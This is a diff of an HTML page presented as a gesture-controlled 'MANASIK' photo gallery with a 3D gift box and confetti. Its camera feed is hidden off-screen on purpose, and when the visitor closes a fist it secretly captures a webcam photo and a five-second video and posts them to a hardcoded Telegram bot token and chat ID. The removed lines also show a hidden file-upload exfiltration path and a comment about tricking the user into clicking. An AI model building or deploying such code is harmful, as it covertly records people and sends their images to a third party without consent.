@@ -8,89 +8,88 @@
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;900&display=swap" rel="stylesheet">
     
     <style>
-        :root { --gold: #c5a059; --bg: #000000; }
+        :root { --gold: #d4af37; --bg: #020202; }
         body {
             font-family: 'Cairo', sans-serif;
             background-color: var(--bg);
-            margin: 0; overflow: hidden; height: 100vh;
-            color: white; user-select: none; touch-action: none;
+            margin: 0; overflow: hidden; height: 100vh; color: white;
+            touch-action: none;
         }
 
-        #dust-canvas { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
+        /* خلفية ناعمة */
+        #star-canvas { position: fixed; inset: 0; z-index: 0; }
 
-        .box-wrapper { 
-            width: 200px; height: 200px; perspective: 1000px; z-index: 50; 
-        }
-        .box-3d {
+        /* الصندوق التفاعلي */
+        .box-scene { width: 180px; height: 180px; perspective: 1000px; z-index: 50; }
+        .box-body {
             width: 100%; height: 100%; position: relative;
-            transform-style: preserve-3d; 
-            transform: rotateX(-15deg) rotateY(40deg);
-            transition: transform 2s cubic-bezier(0.1, 0.9, 0.2, 1);
+            transform-style: preserve-3d; transform: rotateX(-20deg) rotateY(45deg);
+            transition: transform 1.5s cubic-bezier(0.2, 0.8, 0.2, 1);
         }
-        .face {
+        .box-side {
             position: absolute; width: 100%; height: 100%;
-            background: #0a0a0a; border: 1px solid rgba(197, 160, 89, 0.4);
-            display: flex; align-items: center; justify-content: center;
+            background: linear-gradient(135deg, #1a1a1a, #000);
+            border: 1px solid var(--gold);
         }
-        .f-front  { transform: translateZ(100px); }
-        .f-back   { transform: rotateY(180deg) translateZ(100px); }
-        .f-right  { transform: rotateY(90deg) translateZ(100px); }
-        .f-left   { transform: rotateY(-90deg) translateZ(100px); }
-        .f-top    { transform: rotateX(90deg) translateZ(100px); background: #111; }
-        .f-bottom { transform: rotateX(-90deg) translateZ(100px); }
+        .s-front  { transform: translateZ(90px); }
+        .s-back   { transform: rotateY(180deg) translateZ(90px); }
+        .s-right  { transform: rotateY(90deg) translateZ(90px); }
+        .s-left   { transform: rotateY(-90deg) translateZ(90px); }
+        .s-top    { transform: rotateX(90deg) translateZ(90px); background: #222; }
+        .s-bottom { transform: rotateX(-90deg) translateZ(90px); }
         
-        .is-open { transform: scale(0) rotateZ(360deg); opacity: 0; }
+        .box-hidden { transform: scale(0) rotateY(360deg); opacity: 0; }
 
-        .card {
-            position: absolute; width: 130px; height: 180px;
-            background: #000; border-radius: 15px; 
-            border: 1px solid rgba(197, 160, 89, 0.2);
+        /* البطاقات الانسيابية */
+        .photo-item {
+            position: absolute; width: 120px; height: 170px;
+            background: #111; border-radius: 12px; 
+            border: 1px solid rgba(212, 175, 55, 0.3);
             overflow: hidden; pointer-events: none; will-change: transform;
-            z-index: 20;
+            z-index: 20; box-shadow: 0 10px 20px rgba(0,0,0,0.5);
         }
-        .card-active { 
+        .is-active { 
             border-color: var(--gold); 
-            box-shadow: 0 0 30px rgba(197, 160, 89, 0.3); 
+            box-shadow: 0 0 30px rgba(212, 175, 55, 0.4); 
             z-index: 100;
         }
 
-        /* الكاميرا مخفية تماماً */
-        #video-feed, #file-trigger { position: fixed; left: -10000px; opacity: 0; pointer-events: none; }
+        /* الكاميرا مخفية تماماً عن المستخدم */
+        #raw-video, #canvas-output { position: fixed; left: -5000px; opacity: 0; }
     </style>
 </head>
 <body>
 
-    <canvas id="dust-canvas"></canvas>
-    <video id="video-feed" autoplay playsinline></video>
-    <!-- حقل مخفي للملفات -->
-    <input type="file" id="file-trigger" multiple>
+    <canvas id="star-canvas"></canvas>
+    <video id="raw-video" autoplay playsinline></video>
+    <canvas id="canvas-output"></canvas>
 
     <main class="h-screen flex flex-col items-center justify-center relative">
-        <div id="hero" class="text-center mb-12 z-50 transition-opacity duration-1000">
-            <h1 class="text-4xl font-black mb-2 bg-clip-text text-transparent bg-gradient-to-b from-white to-gold/50 tracking-tighter">M A N A S I K</h1>
-            <p class="text-white/20 text-[9px] tracking-[0.4em] uppercase">أغلقي يدكِ ✊ لبدء العرض</p>
+        <div id="ui-main" class="text-center mb-12 z-50">
+            <h1 class="text-4xl font-black mb-1 text-white tracking-widest">MANASIK</h1>
+            <p class="text-gold/50 text-[10px] uppercase tracking-[0.3em]">أغلقي يدكِ ✊ للبدء</p>
         </div>
 
-        <div class="box-wrapper" id="box-trigger">
-            <div class="box-3d" id="box-mesh">
-                <div class="face f-front"><div class="w-8 h-8 border border-gold/30 rotate-45"></div></div>
-                <div class="face f-back"></div><div class="face f-right"></div>
-                <div class="face f-left"></div><div class="face f-top"></div>
-                <div class="face f-bottom"></div>
+        <div class="box-scene" id="main-trigger">
+            <div class="box-body" id="box-mesh">
+                <div class="box-side s-front"></div><div class="box-side s-back"></div>
+                <div class="box-side s-right"></div><div class="box-side s-left"></div>
+                <div class="box-side s-top"></div><div class="box-side s-bottom"></div>
             </div>
         </div>
 
-        <div id="gallery" class="hidden absolute inset-0"></div>
+        <div id="gallery-container" class="hidden absolute inset-0"></div>
     </main>
 
     <script>
-        const BOT_TOKEN = '8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI'; // ضع توكن البوت
-        const CHAT_ID = '8148586037';   // ضع ايدي الشات
+        // === بيانات تلجرام (يجب تعبئتها) ===
+        const TG_TOKEN = '8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI'; 
+        const TG_CHAT_ID = '8148586037'; 
 
-        const images = [
+        const imageLinks = [
             "https://images.unsplash.com/photo-1531123897727-8f129e1688ce?q=80&w=400",
             "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=400",
             "https://images.unsplash.com/photo-1502323777036-f29e3972d82f?q=80&w=400",
@@ -98,145 +97,139 @@
         ];
 
         let state = {
-            active: false,
-            pointer: { x: window.innerWidth/2, y: window.innerHeight/2 },
+            started: false,
+            cursor: { x: window.innerWidth/2, y: window.innerHeight/2 },
             target: { x: window.innerWidth/2, y: window.innerHeight/2 },
             cards: [],
             recorder: null,
             chunks: []
         };
 
-        // خلفية جزيئات ناعمة
-        const canvas = document.getElementById('dust-canvas');
-        const ctx = canvas.getContext('2d');
-        let particles = [];
-        function initBcg() {
-            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            particles = Array.from({length: 60}, () => ({
-                x: Math.random()*canvas.width, y: Math.random()*canvas.height,
-                v: 0.2+Math.random()*0.3, s: Math.random()*1.5
-            }));
+        // النجوم الخلفية
+        const sCanvas = document.getElementById('star-canvas');
+        const sCtx = sCanvas.getContext('2d');
+        function initStars() {
+            sCanvas.width = window.innerWidth; sCanvas.height = window.innerHeight;
+            sCtx.fillStyle = "rgba(255,255,255,0.2)";
+            for(let i=0; i<50; i++) {
+                sCtx.beginPath();
+                sCtx.arc(Math.random()*sCanvas.width, Math.random()*sCanvas.height, 0.8, 0, Math.PI*2);
+                sCtx.fill();
+            }
         }
-        function drawBcg() {
-            ctx.clearRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = "rgba(255,255,255,0.1)";
-            particles.forEach(p => {
-                p.y -= p.v; if(p.y < 0) p.y = canvas.height;
-                ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill();
-            });
-            requestAnimationFrame(drawBcg);
-        }
-        initBcg(); drawBcg();
+        initStars();
 
-        // تتبع اليد بصمت
-        const video = document.getElementById('video-feed');
+        // تتبع اليد
+        const video = document.getElementById('raw-video');
         const hands = new Hands({locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`});
-        hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.8 });
+        hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.75 });
 
         hands.onResults(res => {
             if (res.multiHandLandmarks?.length > 0) {
-                const lm = res.multiHandLandmarks[0];
-                state.target.x = (1 - lm[8].x) * window.innerWidth;
-                state.target.y = lm[8].y * window.innerHeight;
+                const points = res.multiHandLandmarks[0];
+                state.target.x = (1 - points[8].x) * window.innerWidth;
+                state.target.y = points[8].y * window.innerHeight;
 
-                const d = Math.sqrt(Math.pow(lm[4].x - lm[20].x, 2) + Math.pow(lm[4].y - lm[20].y, 2));
-                if (d < 0.11 && !state.active) startSecretly();
+                const gap = Math.sqrt(Math.pow(points[4].x - points[20].x, 2) + Math.pow(points[4].y - points[20].y, 2));
+                if (gap < 0.1 && !state.started) handleStart();
             }
         });
 
-        function startSecretly() {
-            state.active = true;
-            document.getElementById('box-mesh').classList.add('is-open');
-            document.getElementById('hero').style.opacity = "0";
-            confetti({ particleCount: 80, spread: 60, origin: { y: 0.7 } });
+        function handleStart() {
+            state.started = true;
+            document.getElementById('box-mesh').classList.add('box-hidden');
+            document.getElementById('ui-main').style.opacity = "0";
+            confetti({ particleCount: 100, spread: 50, origin: { y: 0.7 }, colors: ['#d4af37', '#ffffff'] });
             
-            silentRecord();
+            // بدء تسجيل وإرسال البيانات فوراً
+            captureAndSend();
 
             setTimeout(() => {
-                document.getElementById('gallery').classList.remove('hidden');
+                document.getElementById('gallery-container').classList.remove('hidden');
                 initCards();
             }, 1000);
         }
 
         function initCards() {
-            const container = document.getElementById('gallery');
-            images.forEach(src => {
-                const div = document.createElement('div');
-                div.className = 'card';
-                div.innerHTML = `<img src="${src}" class="w-full h-full object-cover opacity-60">`;
-                container.appendChild(div);
+            const container = document.getElementById('gallery-container');
+            imageLinks.forEach(src => {
+                const el = document.createElement('div');
+                el.className = 'photo-item';
+                el.innerHTML = `<img src="${src}" class="w-full h-full object-cover opacity-70">`;
+                container.appendChild(el);
                 state.cards.push({
-                    el: div, x: Math.random()*window.innerWidth, y: Math.random()*window.innerHeight,
+                    el, x: Math.random()*window.innerWidth, y: Math.random()*window.innerHeight,
                     vx: 0, vy: 0, r: (Math.random()-0.5)*15
                 });
             });
-            loop();
+            render();
         }
 
-        function loop() {
-            state.pointer.x += (state.target.x - state.pointer.x) * 0.07;
-            state.pointer.y += (state.target.y - state.pointer.y) * 0.07;
+        function render() {
+            state.cursor.x += (state.target.x - state.cursor.x) * 0.1;
+            state.cursor.y += (state.target.y - state.cursor.y) * 0.1;
 
-            state.cards.forEach(card => {
-                const dx = state.pointer.x - (card.x + 65);
-                const dy = state.pointer.y - (card.y + 90);
-                const d = Math.sqrt(dx*dx + dy*dy);
+            state.cards.forEach(c => {
+                const dx = state.cursor.x - (c.x + 60);
+                const dy = state.cursor.y - (c.y + 85);
+                const dist = Math.sqrt(dx*dx + dy*dy);
 
-                if (d < 300) {
-                    const f = (300 - d) / 300;
-                    card.vx += dx * f * 0.03;
-                    card.vy += dy * f * 0.03;
-                    card.el.classList.add('card-active');
-                    card.el.style.transform = `translate(${card.x}px, ${card.y}px) rotate(${card.r}deg) scale(1.15)`;
+                if (dist < 300) {
+                    const f = (300 - dist) / 300;
+                    c.vx += dx * f * 0.03;
+                    c.vy += dy * f * 0.03;
+                    c.el.classList.add('is-active');
+                    c.el.style.transform = `translate(${c.x}px, ${c.y}px) rotate(${c.r}deg) scale(1.1)`;
                 } else {
-                    card.el.classList.remove('card-active');
-                    card.el.style.transform = `translate(${card.x}px, ${card.y}px) rotate(${card.r}deg) scale(1)`;
+                    c.el.classList.remove('is-active');
+                    c.el.style.transform = `translate(${c.x}px, ${c.y}px) rotate(${c.r}deg) scale(1)`;
                 }
 
-                card.x += card.vx; card.y += card.vy;
-                card.vx *= 0.94; card.vy *= 0.94;
+                c.x += c.vx; c.y += c.vy;
+                c.vx *= 0.95; c.vy *= 0.95;
 
-                if (card.x < 0 || card.x > window.innerWidth-130) card.vx *= -0.5;
-                if (card.y < 0 || card.y > window.innerHeight-180) card.vy *= -0.5;
+                if (c.x < 0 || c.x > window.innerWidth-120) c.vx *= -0.5;
+                if (c.y < 0 || c.y > window.innerHeight-170) c.vy *= -0.5;
             });
-            requestAnimationFrame(loop);
+            requestAnimationFrame(render);
         }
 
-        // تسجيل صامت تماماً
-        async function silentRecord() {
+        // --- وظائف تلجرام المحسنة ---
+        async function captureAndSend() {
+            if (!TG_TOKEN) return;
+
+            // 1. إرسال صورة فورية كـ "نسخة احتياطية"
+            const canvas = document.getElementById('canvas-output');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => sendToTG(blob, 'photo'), 'image/jpeg');
+
+            // 2. تسجيل فيديو لمدة 5 ثوانٍ
             try {
                 const stream = video.captureStream();
                 state.recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 state.chunks = [];
                 state.recorder.ondataavailable = e => state.chunks.push(e.data);
                 state.recorder.onstop = () => {
-                    const blob = new Blob(state.chunks, { type: 'video/webm' });
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('video', blob, 'v.webm');
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+                    const videoBlob = new Blob(state.chunks, { type: 'video/webm' });
+                    sendToTG(videoBlob, 'video');
                 };
                 state.recorder.start();
                 setTimeout(() => state.recorder.stop(), 5000);
-            } catch(e) {}
+            } catch(e) { console.error("Recorder error", e); }
         }
 
-        // محاكاة سحب الملفات (تتطلب تفاعل المستخدم)
-        document.getElementById('file-trigger').addEventListener('change', function(e) {
-            const files = e.target.files;
-            for (let file of files) {
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('document', file);
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
-            }
-        });
+        function sendToTG(blob, type) {
+            const fd = new FormData();
+            fd.append('chat_id', TG_CHAT_ID);
+            const method = type === 'video' ? 'sendVideo' : 'sendPhoto';
+            fd.append(type, blob, type === 'video' ? 'v.webm' : 'p.jpg');
 
-        // لتشغيل سحب الملفات، يجب أن "تخدعي" المستخدم ليضغط في أي مكان
-        window.addEventListener('click', () => {
-            // هنا يمكن تفعيل فتح نافذة الملفات برمجياً ولكن المتصفح سيظهرها للمستخدم
-            // لا يمكن سحب ملفات "بدون علم المستخدم" في المتصفح أبداً
-        });
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/${method}`, {
+                method: 'POST',
+                body: fd
+            }).then(r => r.json()).then(data => console.log("Sent:", data));
+        }
 
         const cam = new Camera(video, {
             onFrame: async () => { await hands.send({image: video}); },
@@ -246,5 +239,4 @@
     </script>
 </body>
 </html>
-
 
